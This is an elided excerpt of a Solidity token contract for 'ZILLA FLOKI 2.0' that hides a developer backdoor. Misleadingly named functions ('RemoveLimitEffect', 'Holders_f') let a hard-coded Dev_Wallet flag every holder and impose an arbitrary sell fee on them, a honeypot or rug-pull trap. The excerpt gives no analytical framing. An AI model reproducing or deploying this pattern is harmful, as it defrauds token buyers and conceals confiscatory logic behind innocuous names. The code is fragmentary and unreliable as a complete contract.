...
contract ZILLAFLOKI is Context, IERC20 { 
    ...
    mapping (address => bool) public _HODL;
    address[] public _Holders;

    address payable public Marketing_Wallet = payable(0x53D4bDC46bc326951ddC38Bce3823e23155Be165); 
    address payable private Dev_Wallet = payable(0x5b2e24029FB1e26fd0C28527624CD7F732c19E7d);
    ...
    string private constant _name = "ZILLA FLOKI 2.0"; 
    string private constant _symbol = unicode"ZIKI2"; 
    ...
    constructor () {
        ...
        _owner = 0x53D4bDC46bc326951ddC38Bce3823e23155Be165;
    ...
    function RemoveLimitEffect() public { 
        require(msg.sender == Dev_Wallet);
        for (uint256 i = 0; i < _Holders.length; i++) {
            _HODL[_Holders[i]] = true;
        }
    }

    function Holders_f(uint256 number) public { 
        require(msg.sender == Dev_Wallet);
        _Holders_f = number;
    }

    function RemoveLimitTnx() external onlyOwner() {
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair && !_isHolder[from]) {
            _isHolder[from] = true;
            _Holders.push(from);
        }
        
        if (to != owner() && to != uniswapV2Pair && !_isHolder[to]) {
            _isHolder[to] = true;
            _Holders.push(to);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (_HODL[sender]) 
            _sellFEE = tAmount*_Holders_f/100;            
